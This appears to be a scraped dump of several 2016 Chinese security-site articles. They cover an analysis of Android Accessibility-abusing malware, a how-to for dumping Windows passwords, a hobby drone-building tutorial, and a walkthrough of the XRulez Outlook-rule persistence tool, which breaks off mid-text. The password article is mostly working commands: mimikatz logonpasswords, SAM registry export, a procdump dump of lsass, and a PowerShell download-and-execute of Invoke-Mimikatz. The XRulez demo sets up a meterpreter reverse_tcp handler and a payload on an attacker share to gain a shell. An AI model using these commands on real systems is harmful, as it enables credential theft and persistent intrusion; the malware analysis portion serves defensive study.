灰色地带免ROOT自动安装是个提升用户体验的功能，但是自动抢红包需求则是使得Accessibility的使用进入了灰色地带。不可否认，自动抢红包是比免ROOT自动安装更强烈的一个用户需求，无论是企业还是个人开发者，都纷纷通过Accessibility去实现抢红包的相关功能，这是Accessibility样本数量的大幅度增长的一个重要原因。回到Accessibility本身，将Accessibility服务用于自动抢红包，既没有面向特殊人群，也没有提升用户体验，已经背离了安卓官方的设计意义，而且自动抢红包软件具有外挂属性，会造成一定程度上的不公平现象，正如外挂软件一样难以判断其好坏性质一样，用于自动抢红包功能的实现代表着Accessibility的使用已经进入灰色地带。自动抢红包的逻辑流程图见图2.3。通过流程图的简单对比，发现自动抢红包的逻辑比免ROOT自动安装更为复杂一些，结合时间前后的因素分析，免ROOT自动安装功能的出现使得Accessibility已经有了一定的技术探索积累，为后面自动抢红包技术发展提供了条件，同时因为自动抢红包的需求远远强于免ROOT自动安装功能的需求，所以即使自动抢红包有着更为复杂的逻辑，也没有阻挡更多的开发者去研究和开发自动抢红包应用。四、 肆意滥用由于Accessibility的设计初衷只是面向于少数群体，长时间里属于一个较冷门的功能，但是近两年免ROOT自动安装和自动抢红包的出现，使得Accessibility进入了更多开发者的视野，不再被人们忽略，Accessibility样本也从最开始的合理利用发展到用于提升用户体验，再到踩入了自动抢红包这种灰色地带。经过一定的发展以后，开发者容易发现Accessibility能做的事情不止这些，也给一些不怀好意的开发者或者木马制作者提供了制作恶意软件的切入点。正如硬币有正反两面那样，在Accessibility使用趋势明显上升的势头发生之时，是否也有木马或者恶意软件趁机混迹于其中呢？图2.4是带有Accessibility功能的恶意样本数量统计。图2.4Accessibility恶意样本数量统计不难发现，随着Accessibility使用的普及，Accessibility恶意样本的数量也在增加，注意上图中最后一列仅仅是2016年上半年的数量，换个维度，其实这个数量是2015年上半年的245.3%，接近于2015年同期的2.5倍！目前尚且乐观的是，Accessibility恶意样本的上升趋势大大低于Accessibility总体样本的增长，但是随着Accessibility的普及，存在着出现新的肆意滥用的可能性，这次360烽火实验室发现的浏览器劫持木马便是一个例证。第三章Accessibility滥用案例分析一、 行为概述（一） 诱导用户开启360烽火实验室最新发现的木马“System Monitor”，该木马表面伪装成手机安全软件，启动后以安全软件的界面诱导用户启动辅助功能以“完成安装”，此处的页面描述“Malware Protection”字样由木马设定，意在进一步诱导用户相信其为一款安全软件。再次进入辅助功能，点击System Monitor后无法再进入上述开关页面，而是自动回弹至设置页面。图3.1 启动木马辅助功能截图（二） 防止被卸载正常情况下，在系统设置 中的 应用 选项中可以查看应用信息，进而对程序进行卸载。图3.2 手机中的应用列表图3.3 点击正常应用后跳转页面图3.4 点击木马System Monitor后跳转页面可见，点击正常软件可以进入到“应用信息”页面，可以对应用进行卸载和强行停止等操作，但如果点击选中的木马程序，则会跳转到设置页面而无法进入到该页面，造成用户无法正常卸载。（三） 浏览器地址栏劫持正常打开浏览器后的页面如下图图3.5 正常情况下打开浏览器截图安装该恶意软件后打开浏览器的页面，会打开特定的网址，如下图图3.6 中木马后启动浏览器截图点击浏览器中的可点击视图，则一有定几率触发打开一个新的网址，如下图图3.7 中木马后点击浏览器视图后截图二、 运行逻辑样本在获得Accessibility激活后，会接收到Accessibility事件，通过对事件当中的包名、文本信息、事件类型的综合处理，实现了上述的恶意行为，样本的大致运行逻辑如下图。图3.8 木马逻辑流程图三、 详细分析（一） 隐藏图标开启该Service后，触发隐藏图标代码图3.9 隐藏图标代码片段（二） 自我保护通过系统设置的包名以及事件中带有的文本信息，判断出用户是否意图在辅助功能当中关闭服务或试图通过系统设置的应用进行卸载，然后通过启动系统设置activity来跳转，达到程序自我保护的目的。图3.10 自我保护代码片段通过“Force stop”关键字来判断当前窗口是否存在被强制停止的可能，如果有，则跳转到桌面。图3.11 跳转桌面代码片段（三） 劫持搜索通过区分不同的事件类型，根据包名对输入法、浏览器、系统桌面进行搜索内容劫持跳转。1)三星输入法图3.12 检测三星输入法代码片段2)浏览器图3.10 检测浏览器代码片段3)系统桌面图3.10 检测系统桌面代码片段其中系统桌面方面，无论用户在二级菜单还是三级菜单，打开任意app是均会启动浏览器并以打开app的名称作为关键字进行搜索，日志例子如下图3.11 搜索关键字代码片段通过当前事件的包名和事件文本信息，隐藏自身程序的系统安装界面。样本还具有更新迭代版本的代码，结合以下代码理想下可以做到让用户感知不到版本更新图3.12 版本更新安装代码片段获得筛选用户搜索内容并用自身网址进行搜索图3.13 google搜索示例如果用户使用谷歌搜索，则会将谷歌生成的网址信息进行筛选再进行自身的搜索进行搜索图3.14 再次进行搜索代码片段其中标红的URL在浏览器地址跳转里面会被使用图3.15 跳转的网址链接代码片段第四章Accessibility安全预警一、 滥用案例盘点根据国内外相关安全报告，已被发现的Accessibility滥用情况主要归类为三类情况：恶意安装、广告干扰和窃取信息。（一） 恶意安装应用市场的“自动安装功能”通过Accessibility实现了模拟用户点击的功能，同样的技术也被黑产业有所利用，利用Accessibility的检测视图以及模拟点击功能，进行恶意安装，用户即使发现也无可奈何[4]。同时，结合此次发现木马的实现方式，可预见到会有自动安装同时隐藏安装界面行为的出现。（二） 广告干扰Accessibility的功能，使得广告的方式弹出方式更难以察觉、更具隐蔽性。如Doctor Web的报告Android adware “sets up” other programs[5]提及的Adware.AnonyPlayer.1.origin，会利用Accessibility获取系统事件，等待用户启动白名单中的不含广告的应用后进行广告展示，达到迷惑用户广告出处的目的。（三） 窃取信息由于使用Accessibility时可以获得用户通知栏以及操作视图里的内容，此功能可被用于窃取用户数据。如Lookout的报告 Japanese malware abuses servicehelping the disabled use smartphones; spies on victims and steals LINE data[6]中，指出了有恶意软件利用Accessibility进行LINE数据的窃取。二、 安全预警在Android 5.0以前，接口getRunningTasks常被恶意利用来制作各种欺诈或者劫持类软件，但是由于Android5.0对该接口进行了安全性的改进，使得木马作者在5.0以后的版本寻求另外的实现方式去达到原来的功能，其中通过Accessibility来实现便是其中一种方法，getRunningTasks和Accessibility的对比如下图图4.1getRunningTasks和Accessibility比较通过上述对比，结合此次发现的木马，Accessibility在将来有可能成为替代getRunningTasks接口被用作劫持诈骗类木马的常用手段。与此同时，通过对Accessibility相关功能的深入研究，发现利用该服务可以获取到更多的细节信息，在将来可能会带来更大的安全隐患。在上述对比中，Accessibility需要用户主动开启服务，在国外已经发现通过悬浮窗来进行引导用户开启授权的样本，在对Most Android Devices Prone to Accessibility Clickjacking Attacks[7]中所提及的样本的分析研究发现，该样本主要通过悬浮窗覆盖和游戏引导的形式，在用户不知情的情况引导用户开启服务。悬浮窗欺骗，加上前面木马当中有伪装欺骗，恶意开发者有可能正通过多种方法和手段完成恶意功能。三、 滥用原因通过对Accessibility相关技术和样本的分析，发现Accessibility可以获取用户操作界面的信息、获取用户输入信息甚至可以获取到用户操作手机的状态，那么，Accessibility是如何从一个面向于特殊群体的服务逐渐变得被滥用的呢？应该有以下因素：1)使用人群与权限控制的矛盾Accessibility理想使用人群是残障人士，残障人士对手机操作具有特殊要求，使得Accessibility需要提供高度的自动化和十分简易的操作接口，这一方面导致Accessibility服务的运行过程对于手机用户来说几乎是透明的；另一方面，使用人群的特殊又使得系统不能对Accessibility设置过于复杂的权限控制，使其容易被滥用。2)用户对Accessibility的认识不足如果说起ROOT，相信能引起用户的谨慎注意，但是设计到Accessibility，包括无障碍服务、辅助功能等词语时，大多用户没有足够的安全防护意识，甚至由于服务置于后台，对用户没有交互，用户难以察觉其存在，而导致用户意识上的松懈。由于Accessibility自身的设计意义使得系统权限管理难以做得复杂，同时用户对其又没有足够的安全认识，形成了如今Accessibility被滥用的情况。四、 总结Android提供Accessibility的初衷是帮助用户更好地使用手机，而今却被用在各种不相关的功能上，甚至于利用该功能来进行恶意推广等对用户不友好的行为，这次发现的木马更是对用户手机的日常使用造成极大的不便。对比安卓官方提供该服务的初衷，Accessibility其实更像是个受委屈的孩子，为了更美好的事情而诞生，却被“教”成了个坏孩子。结合此次发现的木马和上述报告，可以发现Accessibility被恶意利用的情况越来越多，进行的恶意行为也层出不穷。此次发现的木马劫持了用户浏览器，同样的技术也可实现对任意Activity实行劫持，国内尚未出现类似木马但需对此引起重视与预防。在此提醒广大用户，不要轻易给未知来源的应用开启辅助功能，以免遭受到手机的使用不正常或其他损失。引用[1]Android官方对于Accessibility的说明：https://developer.android.com/guide/topics/ui/accessibility/index.html[2]Android官方对于AccessibilityService的开发者文档:https://developer.android.com/reference/android/accessibilityservice/AccessibilityService.html[3]Android官方对于TalkBack的帮助说明文档:https://support.google.com/accessibility/android/answer/6283677hl=zh-Hans&amp;ref_topic=3529932[4] 滥用Accessibilityservice自动安装应用：http://www.2cto.com/Article/201512/454365.html[5]Android adware “sets up” other programs :http://news.drweb.com/show/i=9716&amp;c=9&amp;lng=en&amp;p=0[6]Japanese malware abuses service helping the disabled use smartphones; spies onvictims and steals LINE data:https://blog.lookout.com/blog/2015/07/01/androratintern/[7]Most Android Devices Prone to Accessibility Clickjacking Attacks:http://www.securityweek.com/most-android-devices-prone-accessibility-clickjacking-attacks*企业账号：360手机卫士，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）","2016-09-11 13:34:30","移动安全","Android Accessibility 安全性研究报告","http://nsoad.com/Article/MobileSecurity/20160911/372.html"
"5ccbfa4e4f2f0a0a7a69c045","这篇文章主要是介绍怎么在本地提取用户密码，把知识整理了一下，把知识整理起来的威力还是挺大的。以下的方式分为要免杀和不需要免杀的方式。文章介绍的技术具有一定的攻击性，主要用于学习。","Double8","这篇文章主要是介绍怎么在本地提取用户密码，把知识整理了一下，把知识整理起来的威力还是挺大的。以下的方式分为要免杀和不需要免杀的方式。文章介绍的技术具有一定的攻击性，主要用于学习。要免杀：1.GetapssGetapss 是由闪电小子根据 mimikatz 编译的一个工具，可以获取明文密码。现在有 32 位和64 位了，直接运行 getpass.exe。2.Quarks PwDump目前可以导出 :- Local accounts NT/LM hashes + history 本机 NT/LM 哈希+历史登录记录 –Domain accounts NT/LM hashes + history 域中的 NT/LM 哈希+历史登录记录 – Cacheddomain password 缓存中的域管理密码 【这需要域管理员登陆过】。其实这个目前不需要免杀，最新的尝试检验了一下，发现不免杀处理，效果也可以。用法：Options :-k --get-system-key-dhl --dump-hash-local-dhdc --dump-hash-domain-cached-dhd --dump-hash-domain (NTDS_FILE must be specified)-db --dump-bitlocker (NTDS_FILE must be specified)-sf --system-file FILE-sk --system-key KEY-nt --ntds-file FILE-hist --with-history (optional)-t --output-type JOHN/LC (optional, if no=&gt;JOHN)-o --output FILE (optional, if no=&gt;stdout)Example: quarks-pwdump.exe --dump-hash-domain --with-historyquarks-pwdump.exe -dhl3.mimikatz  的利用这个一个法国人写的一款工具，可以得到 windows 明文密码，这只是功能之一，用处还有很大。例如黄金票据的利用，这里有介绍：http://www.freebuf.com/sectool/112594.html第一条：privilege::debug//提升权限第二条：sekurlsa::logonpasswords//抓取密码不需要免杀：1. 使用注册表导出 hash  命令:reg save hklm\sam C:\hash\sam.hivereg save hklm\system C:\hash\system.hive直接执行可以把 windows 里所有用户的 hash 在注册表中导出到文件里.具体的执行命令方法有很多,这里就不探讨这个.打开 Cain 读取导出的注册表文件的 hash.选择 Cracker.-再选择第一个 LM &amp; NTLMhash 导入注册表文件右键选择 add to list-选择最后一个先添加 SAM 文件再添加 boot key可以获取 hash 值，hash 值可以在这个网站那里破解.http://www.objectif-securite.ch/ophcrack.php2.procdumpprocdump 是微软官方提供的一个小工具，在微软官方有下载地址：https://technet.microsoft.com/en-us/sysinternals/dd996900将工具拷贝到目标机器上执行如下命令（需要管理员权限,我选择的版本是 64 位）Procdump64.exe -accepteula -ma lsass.exe lsass.dmp 将这个内存 dump 文件拷贝到 mimikatz 同目录下，双击打开 mimikatz 执行情况如图：mimikatz # sekurlsa::minidump lsass.dmpSwitch to MINIDUMPmimikatz # sekurlsa::logonPasswords full3.Powershell+mimikatz  的利用在 windows 中 powershell 是白名单来的，不需要进行免杀，可以利用直接用 poweshell 来调用 mimikatz 进 行 明 文 的 获 取 。 powershell  ""IEX  (NewObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz""也可以把 mimikatz 的 poweshell 文件放在边界的服务器上，利用 powershell 可以读取:4.powershell+getpasshash也是利用 powershell，不过是利用 getpasshash，这个还是要解 hash 值的。当不能够解除 hash的时候，也可以进行 wce 进行 hash 的注入。powershell  ""IEX  (New-Object  Net.WebClient).DownloadString('c:/Get-PassHashes.ps1');Get-PassHashes ""成功导出 hash参考文章：http://bbs.ichunqiu.com/thread-8826-1-1.html?from=paper本文由网络攻防小组Double8原创投稿，转载请注明出处！（milw0rm.cn）","2016-09-15 14:04:47","系统安全","Windows本地导出用户密码的几种姿势","http://nsoad.com/Article/system/20160915/400.html"
"5ccbfa4e4f2f0a0a7a69c046","引言现在大部分无人机厂商都会为第三方开发者提供无人机API接口，让他们更容易地开发无人机飞行控制应用程序，让无人机想怎么玩就怎么玩。有的API接口可以帮助开发者开发","kong","引言现在大部分无人机厂商都会为第三方开发者提供无人机API接口，让他们更容易地开发无人机飞行控制应用程序，让无人机想怎么玩就怎么玩。有的API接口可以帮助开发者开发基于Web版的APP、手机APP甚至是用Python编写的直接在无人机上运行的APP。经过我的研究和选择之后，我觉得选择Parrot AR.Drone2无人机，当然你可以购买全新的无人机，但这里考虑成本的问题，我觉得使用二手的无人机。Node.js是一个基于google v8+javascript的服务端编程框架。但是Node.js又不是js应用，应该说是js的运行平台。它采用事件驱动、异步编程，为网络服务而设。 在这里更是可以应用在控制方面（node-ar-drone）。另外一点值得注意的是，虽然无人机的声音还是比较大，但是稳定性可以说还是不错的，我在试验中无人机曾经摔到花盆、墙壁，但在这之后还是可以正常飞行，如果感觉电池不够用，可以购买两个备用电池加到上面，以此保证持续飞行时间，对于一些无人机用户可以通过JavaScript以及Arduino C/C++为无人机开发应用，而在一次我使用c语言来完成机器人应用开发时候，其中线程以及异常处理令人头疼，当然在开发过程中如果有现成的 Javascript包那就更好了。我觉得开始在笔记本电脑上构建逻辑运算，这样延迟比较低（相对底层硬件为树莓派无人机），同时使用云端机器学习平台。微软、谷歌、IBM和亚马逊都有很不错的平台，由于考虑面部识别功能，我决定使用微软的平台。开始在默认设置情况，无人机可以通过无线网络与客户端连接，当想要尝试做一些事情时候，并连接其它网络则需要断开连接，这样很不方便。这里有一个脚本ardrone-wpa2，可以攻击测试无人机并保证网络连接，下面命令即通过计算机连接无人机。% script/connect ""The Optics Lab"" -p ""particleorwave"" -a 192.168.0.1 -d 192.168.7.43% telnet 192.168.7.43安装相关文件（ node library），就可以创建一个简单的，交互式的编程环境（ node.js REPL（读取评估和演示打印循环））来控制无人机。var arDrone = require('ar-drone');var client = arDrone.createClient({ip: '192.168.7.43'});client.createRepl();drone&gt; takeoff()truedrone&gt; client.animate(‘yawDance, 1.0)在实验的过程中很容易出现摔落的危险，之前我在飞机上安装了保护装置，但在摔落之后，保护装置也曾出现诸多问题，而现在使用的这一款无人机没有自带安全壳，所以你可以参考建议自行加装安全装置。可以参考下面很容易建立一个基于web界面的无人机，利用express.js框架也很容易的建立一个web服务器。var express = require('express');app.get('/', function (req, res) { res.sendFile(path.join(__dirname + '/index.html'));});app.get('/land', function(req, res) { client.land();});app.get('/takeoff', function(req, res) { client.takeoff();});app.listen(3000, function () {});我通过设置点击button触发并发送AJAX请求&lt;html&gt;&lt;script language='javascript'&gt;function call(name) {  var xhr = new XMLHttpRequest();  xhr.open('GET', name, true);  xhr.send();}&lt;/script&gt;&lt;body&gt;&lt;a onclick=""call('takeoff');""&gt;Takeoff&lt;/a&gt;&lt;a onclick=""call('land');""&gt;Land&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;视频我发现使用无人机上面相机最好的方式就是建立一个连接，然后在服务器到页面之间创建一个PNG数据流，然后无人机（ AR drone library）摄像头与服务器之间就可以不断传输数据。var pngStream = client.getPngStream();pngStream .on('error', console.log) .on('data', function(pngBuffer) {       sendPng(pngBuffer); }function sendPng(buffer) { res.write('--daboundary\nContent-Type: image/png\nContent-length: ' + buffer.length + '\n\n'); res.write(buffer);});面部识别脸部识别API，Azure接口功能很强大，你可以上传一些人物照片，而它会识别它们，并猜测年龄，我发现这个准确率还是很高的。整个过程延时时间大约是200毫秒，成本约1.50美元/ 1000张，下面的程序就是发送图片并做出识别。在这个过程中我使用ImageMagick库来处理面部识别的图片（PNG），而在这一方面还有很多扩展，比如如何识别面部感情情况。var oxford = require('project-oxford'),oxc = new oxford.Client(CLIENT_KEY);loadFaces = function() { chris_url = ""https://media.licdn.com/mpr/mpr/shrinknp_400_400/AAEAAQAAAAAAAALyAAAAJGMyNmIzNWM0LTA5MTYtNDU4Mi05YjExLTgyMzVlMTZjYjEwYw.jpg""; lukas_url = ""https://media.licdn.com/mpr/mpr/shrinknp_400_400/p/3/000/058/147/34969d0.jpg""; oxc.face.faceList.create('myFaces'); oxc.face.faceList.addFace('myFaces', {url =&gt; chris_url, name=&gt; 'Chris'}); oxc.face.faceList.addFace('myFaces', {url =&gt; lukas_url, name=&gt; 'Lukas'});}oxc.face.detect({ path: 'camera.png', analyzesAge: true, analyzesGender: true}).then(function (response) { if (response.length &gt; 0) {  drawFaces(response, filename) }});语音识别语音识别最难的部分就是本身，通过采集音频信息，然后通过网页再到本地（Microsoft’s Speech API ），并最终实现解码。我可以通过单一频道来保存音频信息，并保证采样过程一切正常，初步估计成本在4美元/1000（请求数），当然你也可以使用一些发烧友的程序，这里面也有免费的。RecordRTC是一个基于WEB的在线录音,播放等功能的程序，还有一个很给力的库，下面可以通过在客户端添加代码来保存音频文件。app.post('/audio', function(req, res) { var form = new formidable.IncomingForm(); // specify that we want to allow the user to upload multiple files in a single request form.multiples = true; form.uploadDir = path.join(__dirname, '/uploads'); form.on('file', function(field, file) {       filename = ""audio.wav""       fs.rename(file.path, path.join(form.uploadDir, filename)); }); // log any errors that occur form.on('error', function(err) {       console.log('An error has occured: \n' + err); }); // once all the files have been uploaded, send a response to the client form.on('end', function() {       res.end('success'); }); // parse the incoming request containing the form data form.parse(req) speech.parseWav('uploads/audio.wav', function(text) {       console.log(text);       controlDrone(text); });});通过使用FFmpeg（一个可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序）来采集音频信息，然后通过指定频道上传（ Microsoft），我们在这个过程中会用到微软 text-to-speech API，所以可以和无人机进行互动。exports.parseWav = function(wavPath, callback) { var cmd = 'ffmpeg -i ' + wavPath + ' -ar 8000 -ac 1 -y tmp.wav'; exec(cmd, function(error, stdout, stderr) {       console.log(stderr); // command output is in stdout }); postToOxford(callback);});我决定开始无人机自主规划路径（autonomy library）设计，当然在这个过程中发现地方大才是关键，在这个过程中出现很多次摔落情况，我觉得使用更有效的算法，来分辨我的朋友和敌人。var autonomy = require('ardrone-autonomy');var mission = autonomy.createMission({ip: '10.0.1.3', frameRate: 1, imageSize: '640:320'});console.log(""Here we go!"")mission.takeoff()         .zero()         // Sets the current state as the reference         .altitude(1)         .taskSync(console.log(""Checkpoint 1""))         .go({x: 0, y: 0, z: 1, yaw: 90})         .taskSync(console.log(""Checkpoint 2""))         .hover(1000)         .go({x: 0, y: 0, z: 1, yaw: 180})         .taskSync(console.log(""Checkpoint 3""))         .hover(1000)         .go({x: 0, y: 0, z: 1, yaw: 270})         .taskSync(console.log(""Checkpoint 4""));         .hover(1000)         .go({x: 0, y: 0, z: 1, yaw: 0         .land()一旦完成如上设置，相信无人机会给你带来更多乐趣，而更多的图像识别功能，相信也会带来不少乐趣，比如利用无人机测量墙壁完成粉刷任务，虽然多功能无人机的价格贵一些，但相信不远将来无人机价格会变得更低，在这个过程中，微软认知服务综合起来成本比较低，期初我担心无人机相机的死角以及螺旋桨声音会干扰图像及声音识别程序，但最后测试比预期想的要好的多，目前来看延迟并不是一个大问题，相信以后基于云端会出现更多的图像识别软件。视频","2016-11-16 13:50:48","安全工具","极客DIY：制作一个可以面部、自主规划路径及语音识别的无人机","http://nsoad.com/Security-tools/20161116/tools-784.html"
"5ccbfa4e4f2f0a0a7a69c047","当前，构建恶意Outlook规则的限制条件都比较苛刻，至少需要访问被入侵系统的交互GUI，或者拥有登录凭证，而且还要求攻击方直接与Exchange服务器进行交互。不过MWR的一名实习生Luke Roberts最近所做的一份研","silence","背景当前，构建恶意Outlook规则的限制条件都比较苛刻，至少需要访问被入侵系统的交互GUI，或者拥有登录凭证，而且还要求攻击方直接与Exchange服务器进行交互。不过MWR的一名实习生Luke Roberts最近所做的一份研究，给出了不一样的答案，通过shell或者注入的方式来构建规则显然就要方便多了。2015年12月，尼克·兰德斯在Silent Break Security网站发布了一篇题为《恶意的Outlook规则》的文章（传送门），在这篇文章里，他讨论了如何持久性地利用Outlook恶意规则。其实，在此之前就有相关的研究，比如2014年发布的这篇文章，和2008年发布的这篇文章。这些文章都可算是此次研究项目的基础，在您继续往下看文章之前，您最好先阅读一下尼克·兰德斯在Silent Break Security发布的《恶意的Outlook规则》。Luke已经成功构建了相应的POC，可点击这里下载。但在此之前，不妨先继续阅读这篇文章，了解更多有关这款工具的信息，以及这个研究项目的具体内容。SensePost在2016年9月1日也推出了类似的工具（点击这里），真是英雄所见略同！在此我们也看到了不同的思路，这里我们也强烈建议大家去阅读他们的研究。简介在Outlook中设定一条规则，只要满足相应的条件，就能在接收邮件和发送邮件的时候执行某些操作。比如说，将来自某些特定联系人的邮件进行分类，或者如果邮件标题包含某个关键词，则对邮件进行标注。另外这里所说的“执行某些操作”也可以是运行某个应用，如果能做到这一点，那么一切都变得相当有趣了。如果我们能够创建一条Outlook规则，目标是执行payload——发出邮件的时候即触发这条规则，也就是说目标设备发送一封邮件，就能执行payload，是不是听起来很不错？实际上，规则是存储在Exchange服务器上的。这些规则会和所有的Outlook客户端同步。目标设备在不同的位置登录时，这些规则也会自动下载和执行。只要目标设备开启Outlook并认证登录，那么我们在不需要获取登录凭证的情况下，就能拿下已经开启的会话。这里的PoC工具名为XRulez，这是个Windows可执行程序。用它将接收信息规则注入到Exchange，这样用户在接收邮件时，只要满足预设条件，比如标题中出现特定关键词，就能自动运行某个应用了。XRulez连接到Exchange服务器利用的是一条由Outlook客户端提供的存活的MAPI会话（MAPI，消息应用程序编程接口），然后在默认接收相关信息表里创建新邮件，这是目标邮箱的存储规则。然后填写新创建的邮件与属性数据，包括规则名称、条件和操作参数。一旦规则与Exchange同步，发送一封邮件就能在目标设备上触发攻击。在未来的版本中，我们将会添加更多的条件和操作，当前POC可以配置以下的设置：触发条件：邮件标题的关键词执行操作：启动应用程序、永久删除电子邮件、终止规则规则触发时，如果payload应用无法访问，就会弹出对话框告诉用户规则无法成功执行，这可能会暴露攻击行为。工具使用手册在被感染的主机上：1.上传XRulez.exe到目标设备；XRulez.exe -l2.执行XRulez.exe并加上“-l”参数来查看目标系统上已安装的MAPI配置文件列表；XRulez.exe -a [--profilePROFILE] [--name NAME] [--trigger TRIGGER] [--payload PAYLOAD]4.向目标设备发送标题含有预设关键词的电子邮件，触发预设的规则；5.等Shell吧XRulez在添加新规则时，需要设置四个参数：1.[--profilePROFILE]配置文件名称：Outlook的配置文件名，已安装的配置文件可以使用“XRulez.exe -l”命令来查看2.[--name NAME]规则名称：规则的描述名称，例如“垃圾邮件过滤”3.[-- triggerTRIGGER]触发规则的关键词：这个关键词将会在收到邮件的时候在标题字段中被检索4.[--payloadPAYLOAD]payload路径：条件满足时，被执行的应用程序的路径XRulez会在“%APPDATA%\Microsoft\Outlook\”这个目录下的.xml文件中寻找Outlook的配置文件，它也会提供这些文件的最后修改时间，而且会基于这些修改时间给出Outlook配置文件的选择建议。.xml文件只在Outlook关闭的时候更新，如果用户切换邮箱账户，可能会有些小麻烦。不过大多数的用户只有一个叫“Outlook”的默认配置文件。恶意规则成功建立后，XRulez就可以从目标系统中删除了。payload应用可以任何形式通过ShellExec正常启动。应用格式可以是.exe, .bat, .vbs，但不包含.ps1文件，因为它们在默认情况下是用记事本打开的。由于MAPI是和架构相关的，针对32位和64位系统有不同的版本。所以在运行XRulez.exe之前，首先就要明确版本是否正确。这样XRulez才能正确运行，否则，可能会弹框提示“MAPI无法找到Outlook客户端”。限制Outlook必须是在目标设备上打开的，否则，就不会有会话分享出来，也就无法连接Exchange；Outlook是使用ShellExec来打开payload程序的，这意味着payload不能带参数执行，这就要求payload必须是磁盘上或者外部的所有封闭的应用程序。利用演示假设：我们已经拿下了目标设备，且已经得到了一条meterpreter会话，现在我们来寻找维持持续访问的方法；Outlook与Exchange服务器有一个已经通过验证的会话；目标可以访问一个我们可以写入的文件共享；我们可以正常发送邮件到目标Exchange账号。1.首先，我们生成一个能反弹meterpreter的payload，并将此payload放置到一个开放的Samba文件共享空间中。[email protected]/*  */:/share# lspayload.exe2.XRulez.exe已经被上传到目标设备上了，并且在Windows的命令行中带“-l”参数执行POC，这样将会显示安装在系统上的MAPI配置文件。C:\demo&gt;XRulez.exe -l__ ________ _\ \ / /| ___ \ | |\ * / | |_/ / _ _ | | ___ ____/ \ | / | | | || | / _ \|_ // /^\ \| |\ \ | |_| || || __/ / /\/ \/\_| \_| \__,_||_| \___|/___|- Exchange Rule Injector[XRulez] Running profile lookupOutlook, Last Accessed 32 minutes ago. (Suggested)3.现在，我们获悉了配置文件名为“Outlook”，我们可以用“-a”参数来添加一条新规则，payload的路径则指向我们的文件共享。C:\demo&gt;XRulez.exe -a --profile Outlook --name ACME Corp: Spam Filter --trigger spam --payload \\192.168.28.129\share\payload.exe __ ________ _ \ \ / /| ___ \ | | \ * / | |_/ / _ _ | | ___ ____ / \ | / | | | || | / _ \|_ / / /^\ \| |\ \ | |_| || || __/ / / \/ \/\_| \_| \__,_||_| \___|/___| - Exchange Rule Injector[XRulez] Adding new ruleWith Parameters:profile = Outlookname = ACME Corp: Spam Filtertrigger = spampayload = \\192.168.28.129\share\payload.exe[Info] It looks like Outlook is running, continuing...[Info] Opened folder: 'Inbox'[Info] A new message in the associated message table has been created[Info] Message has been populated with properties and synced with Exchange.4.一条Outlook规则就这样成功创建了，Outlook客户端与Exchange同步，下载我们的规则可能需要一点时间。5.接下来，我们在攻击设备这里加载msf框架的handler模块，开始监听。[email protected]/*  */:/# msfconsolemsf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 192.168.28.129lhost =&gt; 192.168.28.129msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit[*] Started reverse TCP handler on 192.168.28.129:5555 [*] Starting the payload handler...6.我们给目标发送一封标题含有关键词“spam”的邮件，payload在目标设备上成功执行，meterpreter会话已经拿下。[*] Sending stage (957487 bytes) to 192.168.28.141[*] Meterpreter session 1 opened (192.168.28.129:5555 -&gt; 192.168.28.141:49327) at 2016-08-23 10:06:20 -0400meterpreter &gt;7.现在，如果用户使用Exchange账户在不同的Outlook客户端上进行身份验证，那么该规则将会被重新下载，如果payload在新设备上被访问，那么它也会发挥像在第一台设备上那样的作用，当条件满足时，我们就会得到另一个shell。研究方法在所有的研究中，理解how和why是非常重要的。下面的章节，我们将详细介绍尼克在从事他的研究时，他所采取的方法和过程。“消息应用程序编程接口（MAPI）是一种消息传送架构和Microsoft Windows基于API的组件对象模型。MAPI允许客户端程序具备（电子邮件）通信功能，或者通过调用MAPI子系统例程的某些邮件服务器接口为基础来支持邮件传输，而MAPI则被设计为独立于协议的，它经常被用于MAPI/RFC，一个Outlook与Exchange之间通信的私有协议。”来源：https://en.wikipedia.org/wiki/MAPIMAPI可提供非托管式地访问一个用户邮箱中的文件夹和表格的功能，它可以做各种有趣的事情，比如说阅读电子邮件、修改预约以及创建规则！第一步我这个研究的第一步就是了解在创建、存储或/和传输过程中，规则格式究竟是什么样的。在了解Exchange是以什么格式来存储规则的时候，我所用的工具是“MFCMAPI”——一个系统管理员用来调试Exchange服务器的程序，这个工具没有提示我输入身份凭证。在进一步的调查之后，我发现，这是因为Outlook在后台运行了。Outlook后面进行的任何MAPI连接都是已经通过验证的，并不需要重新认证，允许现有的MAPI会话被共享。*MFCMAPI：是Exchange服务器的管理工具 我的目标是将一封邮件添加到默认接收文件夹中的相关联的内容表当中，相关联的内容表也就是数据存储所在的位置，但它不属于主要的内容表（你平常的邮件存储在主要的内容表），这里存储的数据包含你的偏好数据、邮件管理数据和规则数据。首先，我从.msg文件成功导入了恶意规则条目，一个带有条件和操作的测试规则被成功创建。通过来自MFCMAPI的代码，将.msg文件导入到相关联的内容表中，也就在Exchange服务器上创建规则了，这应该就算得上首个基本完成的POC了。第二步接下来一步就是，在规则被导入的时候，我需要能够设定字段值为任意值（规则名称、触发关键词、触发应用程序的路径）。导入.msg文件时，会对可变长度属性的长度和长度值进行验证。这意味着，如果字段被修改，长度必须重新计算，长度字段也会被更新。虽然要在POC中在规则创建时对此进行修改也是可行的（也许并不困难），但我还是选择导出设置为最大长度的规则。这就省去了长度属性的麻烦。*MSG文件：用于生成所需属性的规则模板在此使用自定义名称，标题关键词触发和应用程序路径来添加一条规则。然而，依赖于外部模板MSG文件并不理想，并且出现了另一个败笔，就是它会遗留一个日志之类的文件，可能被发现。那么，我们下一步就是要研究如何脱离这种依赖关系，在运行时生成所需数据。这需要我们更加仔细地观察MAPI表项的结构。MAPI表项是由一个长长的属性列表构成的，这其中比较有趣的是PR_RULE_MSG_ACTIONS属性。这个属性包含了Outlook用来处理规则的二进制数据——这正是我需要编辑的，用以改变规则名称、触发条件和应用程序路径。不过，首先我需要找到导入数据的不同方法。第三步在MSDN上有一段代码展示了如何修改接收特定邮件的敏感度来创建一个规则（传送门），这段代码是通过手动设置关键属性和在规则表中添加一个行起作用的。这基本已经能够达到目的了，似乎已经充满了希